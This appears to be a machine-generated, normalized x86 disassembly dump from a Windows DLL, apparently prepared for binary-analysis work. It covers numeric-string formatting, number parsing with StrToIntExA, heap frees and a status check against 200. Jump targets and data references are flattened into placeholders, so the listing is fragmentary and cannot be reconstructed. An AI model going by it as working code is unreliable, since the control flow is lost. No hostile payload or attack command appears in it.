mov al [ ebp + 0x1c ]
mov [ ebp - 0x7c ] al
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x2c ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x84 ]
push eax
mov ecx edi
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
call sub_1005434f
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov ebx eax
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x68 ] ebx
call sub_10069ce0
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_10051f6c
mov eax [ ebx ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x8 ]
xor ebx ebx
mov [ ebp - 0x80 ] al
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov al [ esi ]
mov [ ebp - 0x4 ] 0x2
cmp al 0x2b
je r-xdata
mov [ ebp - 0x78 ] 0x1
mov [ ebp - 0x78 ] ebx
cmp al 0x2d
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov [ ebp - 0x58 ] ebx
call sub_100680bc
mov eax [ eax ]
push [ ebp - 0x50 ]
mov al [ eax ]
push 0x65
push esi
mov [ ebp - 0x60 ] al
mov [ ebp - 0x5f ] 0x65
call sub_10079480
push [ ebp - 0x50 ]
mov [ ebp - 0x70 ] eax
movsx eax [ ebp - 0x60 ]
push eax
push esi
call sub_10079480
add esp 0x18
mov [ ebp - 0x4c ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x58 ]
add eax [ ebp - 0x50 ]
mov ecx [ edi + 0x20 ]
add eax [ ebp - 0x64 ]
add eax [ ebp - 0x5c ]
cmp [ edi + 0x24 ] ebx
jl r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov [ ebp - 0x4c ] ebx
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movsx eax [ ebp - 0x60 ]
push [ ebp - 0x50 ]
push eax
push esi
call sub_10079480
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax 0x100
jne r-xdata
cmp ecx eax
jbe r-xdata
cmp ecx ebx
jbe r-xdata
push [ ebp - 0x50 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_10067f90
mov eax [ ebp - 0x70 ]
cmp eax ebx
jne r-xdata
push [ ebp - 0x50 ]
push 0x65
push esi
call sub_10079480
add esp 0xc
cmp eax ebx
je r-xdata
push [ ebp - 0x80 ]
sub eax esi
lea ebx [ eax + 0x1 ]
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x74 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_10052557
mov ecx [ eax ]
push [ ebp - 0x5c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push eax
push [ ebp - 0x54 ]
call sub_1000def6
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x68 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
mov [ ebp - 0x68 ] al
mov eax [ ebp + 0x10 ]
push [ ebp - 0x68 ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0x14 ]
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x84 ] eax
call sub_1002c59e
push [ ebp - 0x64 ]
mov ecx [ ebp - 0x84 ]
mov eax [ ebp - 0x88 ]
push 0x30
push ecx
push eax
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x54 ]
mov [ ebp + 0x14 ] ecx
call sub_1000def6
mov ecx [ eax ]
sub [ ebp - 0x50 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
push [ ebp - 0x4c ]
lea eax [ ebp - 0x74 ]
push [ ebp - 0x7c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_1000def6
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4c ] ebx
mov [ ebp + 0x14 ] eax
add esp 0x18
cmp [ ebp - 0x78 ] ebx
jbe r-xdata
sub ecx eax
mov [ ebp - 0x4c ] ecx
jmp r-xdata
cmp [ ebp - 0x4c ] ebx
jne r-xdata
push 0x30
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
call sub_1003f510
jmp r-xdata
push [ ebp - 0x80 ]
lea eax [ ebp - 0x6c ]
push [ ebp - 0x50 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_10052557
mov ecx [ eax ]
push [ ebp - 0x58 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push eax
push [ ebp - 0x54 ]
call sub_1000def6
mov ecx [ eax ]
push [ ebp - 0x4c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push [ ebp - 0x7c ]
mov [ ebp + 0x14 ] eax
push eax
push ecx
push [ ebp - 0x8c ]
mov [ edi + 0x20 ] ebx
push [ ebp - 0x54 ]
mov [ edi + 0x24 ] ebx
call sub_1000def6
add esp 0x4c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10041a20
mov eax [ ebp - 0x8c ]
call sub_1004fa89
retn
push [ ebp - 0x80 ]
sub eax esi
lea ebx [ eax + 0x1 ]
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x6c ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_10052557
mov ecx [ eax ]
push [ ebp - 0x58 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x54 ]
call sub_1000def6
mov ecx [ eax ]
and [ ebp - 0x58 ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x34
test [ edi + 0x14 ] 0x4
mov [ ebp + 0x14 ] ecx
mov ecx r--data
jne r-xdata
push 0x1
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x74 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_100614ea
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc esi
dec [ ebp - 0x50 ]
mov [ ebp + 0x14 ] eax
mov eax [ edi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
push 0x30
push [ ebp - 0x58 ]
sub eax esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_1000bddb
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
call sub_1003f510
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x5c ] ebx
push 0x30
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x4c ] ebx
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x54 ]
call sub_100614ea
mov ecx [ eax ]
sub [ ebp - 0x50 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
mov ecx r--data
mov ebx [ ebp - 0x4c ]
push [ ebp - 0x64 ]
sub ebx esi
lea eax [ ebx + 0x1 ]
push eax
call sub_1000bddb
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
push ebx
call sub_1000bddb
and [ ebp - 0x64 ] 0x0
xor ebx ebx
push [ ebp - 0x5c ]
call sub_1003f510
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
lea esi [ ebp - 0x48 ]
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
mov [ ebp - 0x5c ] ebx
jae r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
push eax
call sub_1007d0f0
pop ecx
pop ecx
mov [ ebp - 0x4c ] eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov esi [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x4c ]
sub ecx [ ebp - 0x78 ]
movsx eax al
cmp eax ecx
jae r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x50 ] eax
lea esi [ ebp - 0x2c ]
sub [ ebp - 0x4c ] eax
push ebx
push 0x1
push [ ebp - 0x4c ]
lea ecx [ ebp - 0x2c ]
call sub_1000bddb
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_1003233d
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10018870
add esp 0x14
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_1004fd6f
mov [ eax ] ebx
call sub_1001d849
mov eax ebx
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
test esi esi
setg cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_1007cd82
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add eax edi
add ecx eax
push ecx
call sub_100458a4
add esp 0x10
test eax eax
je r-xdata
sub_10032440
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax edx
push esi
lea esi [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
push r--data
call sub_10004360
add esp 0xc
pop esi
pop ebp
retn
sub_10032470
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0xc ]
cmp ecx 0xffffffff
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0x10 ]
add [ esi ] eax
add [ esi + 0x1c ] eax
push edi
mov edi [ esi ]
cmp ecx 0xa
jne r-xdata
cmp ecx 0x9
jne r-xdata
mov eax 0x1
add [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
jmp r-xdata
inc [ esi + 0x18 ]
mov eax [ esi + 0x2c ]
mov ecx [ eax ]
mov ecx [ ecx + 0xc ]
mov eax [ esi + 0x18 ]
xor edx edx
div ecx
inc eax
imul eax ecx
mov [ esi + 0x18 ] eax
jmp r-xdata
cmp edi [ esi + 0x8 ]
pop edi
jae r-xdata
mov [ esi + 0xc ] 0xffffffff
call sub_10078790
pop esi
pop ebp
retn
sub_100324e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081a65
mov eax [ fs : 0x0 ]
push eax
sub esp 0x114
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xor eax eax
cmp [ ebx + 0xec ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x1000
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x104 ] eax
jbe r-xdata
mov eax 0x42
jmp r-xdata
push 0x3
lea esi [ ebp - 0x100 ]
mov edi ebx
call sub_10023b00
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x2
push r--data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x64 ] al
call sub_10043190
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x100 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0x64 ]
call sub_1001a220
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
jne r-xdata
push r--data
call sub_10050437
push esi
push ebx
lea eax [ ebp - 0x100 ]
call sub_1000e9c0
mov ecx [ esi + 0x10 ]
mov edx [ ebx + 0x50 ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x114 ] ecx
cmp edi 0x1
ja r-xdata
push r--data
call sub_10050437
mov eax [ esi + 0x2c ]
mov [ ebp - 0x110 ] eax
cmp edi 0x2
ja r-xdata
push r--data
call sub_10050437
mov ecx [ ebx + 0x108 ]
mov eax [ esi + 0x48 ]
add ecx 0x7
lea eax [ eax + ecx * 2 ]
add eax ecx
add eax [ ebp - 0x110 ]
mov ecx [ ebp + 0xc ]
add eax [ ebp - 0x114 ]
add eax edx
cmp ecx eax
ja r-xdata
push r--data
call sub_10050437
sub ecx eax
push ecx
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x120 ] ecx
call sub_100074a0
push eax
lea eax [ ebp - 0xd4 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10021390
add esp 0xc
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
cmp [ ebp - 0x50 ] 0x10
jb r-xdata
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp eax 0x1
ja r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1006591f
add esp 0x4
lea ecx [ ebp - 0x100 ]
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x64 ] 0x0
call sub_1001e530
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_1006591f
add esp 0x4
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x100 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0xd4 ]
call sub_1001a220
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x100 ]
call sub_1000e9c0
push 0x24ac4
lea esi [ ebp - 0xf0 ]
mov [ ebp - 0x114 ] eax
call sub_1006a2d0
push eax
lea edx [ ebp - 0xb8 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x5
call sub_10021390
add esp 0x10
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0xdc ] 0x10
jb r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0xdc ] 0xf
mov [ ebp - 0xe0 ] 0x0
mov [ ebp - 0xf0 ] 0x0
cmp ecx 0x2
ja r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_1006591f
add esp 0x4
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x100 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0xb8 ]
call sub_1001a220
mov ecx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x100 ]
call sub_1000e9c0
mov ecx [ ebp - 0x11c ]
push ecx
lea edx [ ebp - 0x9c ]
push edx
mov [ ebp - 0x110 ] eax
call sub_100074a0
mov esi eax
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x8
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x9
call sub_1006bcb0
mov ecx eax
mov [ ebp - 0x4 ] 0xa
mov esi [ ebp - 0xfc ]
mov edi [ ebp - 0x100 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_10050437
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_10035d20
mov edi 0x10
cmp [ ebp - 0x18 ] edi
jb r-xdata
push r--data
call sub_10050437
mov esi 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x114 ]
push ecx
lea edx [ ebp - 0x9c ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xd4 ]
push eax
lea ecx [ ebp - 0x2c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xb
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xc
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0xd
mov ecx [ ebp - 0xfc ]
mov edi [ ebp - 0x100 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x9c ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x34 ] esi
jb r-xdata
push r--data
call sub_10050437
mov edi 0xf
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x110 ]
push ecx
lea edx [ ebp - 0x9c ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x2c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xe
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xf
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x10
mov ecx [ ebp - 0xfc ]
mov edi [ ebp - 0x100 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x9c ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x38 ]
push esi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x34 ] esi
jb r-xdata
push r--data
call sub_10050437
mov edi 0xf
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_1006591f
add esp 0x4
lea ecx [ ebp - 0x80 ]
push ecx
lea edi [ ebp - 0x100 ]
call sub_10055ba0
mov [ ebp - 0x4 ] 0x11
mov eax [ ebp - 0x80 ]
xor edi edi
mov esi 0x10
mov [ ebp - 0x118 ] edi
cmp [ ebp - 0x6c ] esi
jae r-xdata
mov eax [ ebp - 0x9c ]
push eax
call sub_1006591f
add esp 0x4
mov ebx [ ebx + 0xec ]
mov edx [ ebx ]
mov edx [ edx + 0x8 ]
lea ecx [ ebp - 0x108 ]
push ecx
lea ecx [ ebp - 0x104 ]
push ecx
lea ecx [ ebp - 0x118 ]
push ecx
mov ecx [ ebp - 0x70 ]
push ecx
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx ebx
call edx
test eax eax
jne r-xdata
lea eax [ ebp - 0x80 ]
mov ecx [ ebp - 0x104 ]
mov [ ebp - 0x10c ] 0x3
cmp [ ebp - 0x118 ] 0xc8
jne r-xdata
cmp [ ebp - 0x6c ] esi
jb r-xdata
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x104 ] edi
mov ecx [ ebp - 0x104 ]
cmp ecx edi
je r-xdata
mov ebx 0x10
mov esi 0xf
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x80 ] 0x0
cmp [ ebp - 0xa4 ] ebx
jb r-xdata
mov eax [ ebp - 0x80 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0x10c ] 0x4
jmp r-xdata
cmp [ ecx ] al
je r-xdata
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xb8 ] 0x0
cmp [ ebp - 0xc0 ] ebx
jb r-xdata
mov ecx [ ebp - 0xb8 ]
push ecx
call sub_1006591f
add esp 0x4
cmp ecx edi
je r-xdata
mov eax [ ebp - 0x108 ]
mov dl [ eax + ecx - 0x1 ]
cmp dl 0xa
je r-xdata
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xd4 ] 0x0
cmp [ ebp - 0x50 ] ebx
jb r-xdata
mov edx [ ebp - 0xd4 ]
push edx
call sub_1006591f
add esp 0x4
mov [ eax + ecx - 0x1 ] 0x0
mov eax [ ebp - 0x108 ]
mov ecx [ ebp - 0x104 ]
dec eax
mov [ ebp - 0x108 ] eax
cmp dl 0x20
jne r-xdata
lea ecx [ ebp - 0x100 ]
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x64 ] 0x0
call sub_1001e530
mov eax [ ebp - 0x10c ]
mov eax [ ebp - 0x64 ]
push eax
call sub_1006591f
add esp 0x4
cmp [ ebp - 0x120 ] eax
je r-xdata
push ecx
lea ecx [ ebp - 0x108 ]
call sub_10032ce0
mov ecx [ ebp - 0x104 ]
mov eax [ ebp - 0x108 ]
cmp eax edi
je r-xdata
mov [ ebp - 0x10c ] 0x5
jmp r-xdata
sub_10032ce0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080c70
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x88 ] ecx
cmp eax ebx
jne r-xdata
mov ecx [ ecx ]
push ecx
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10043190
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x1c ]
cmp eax 0xe
jae r-xdata
lea eax [ ebx + 0x1 ]
jmp r-xdata
mov esi 0x3
cmp eax esi
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov esi eax
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1006591f
add esp 0x4
push eax
push r--data
push ecx
call sub_10050b90
add esp 0xc
cmp eax ebx
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov edi [ ebp - 0x18 ]
mov ecx [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
cmp edi 0x10
jb r-xdata
cmp esi 0x3
jb r-xdata
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1006591f
add esp 0x4
xor eax eax
cmp esi 0x3
setne al
cmp eax ebx
je r-xdata
push 0x8
push 0x3
lea edx [ ebp - 0x64 ]
push edx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x84 ] ebx
call sub_1004d2f0
push eax
lea eax [ ebp - 0x48 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10021390
add esp 0xc
mov esi 0x10
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] bl
cmp [ ebp - 0x34 ] esi
jae r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_1006591f
add esp 0x4
lea edx [ ebp - 0x84 ]
push edx
push 0x1
push eax
call [ StrToIntExA@IAT ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x48 ]
push 0x3
push 0xb
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10040200
mov ebx eax
push 0x3
lea eax [ ebx + 0x4 ]
push eax
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10040200
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x48 ]
call sub_10061060
lea ecx [ ebp - 0x2c ]
call sub_10061060
mov eax 0x4
jmp r-xdata
push 0x4
add esi 0x3
push esi
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10040200
cmp esi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x48 ]
call sub_10061060
lea ecx [ ebp - 0x2c ]
call sub_10061060
mov eax 0x5
jmp r-xdata
cmp eax esi
jae r-xdata
lea ecx [ ebp - 0x48 ]
call sub_10061060
lea ecx [ ebp - 0x2c ]
call sub_10061060
mov eax 0x6
jmp r-xdata
sub eax esi
mov edi eax
push edi
push esi
lea ecx [ ebp - 0x80 ]
push ecx
lea ecx [ ebp - 0x2c ]
call sub_1004d2f0
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x80 ]
mov esi 0x10
cmp [ ebp - 0x6c ] esi
jae r-xdata
lea ecx [ ebp - 0x48 ]
call sub_10061060
lea ecx [ ebp - 0x2c ]
call sub_10061060
mov eax 0x7
jmp r-xdata
mov edx edi
call sub_1004a310
cmp eax [ ebp - 0x84 ]
je r-xdata
lea ecx [ ebp - 0x80 ]
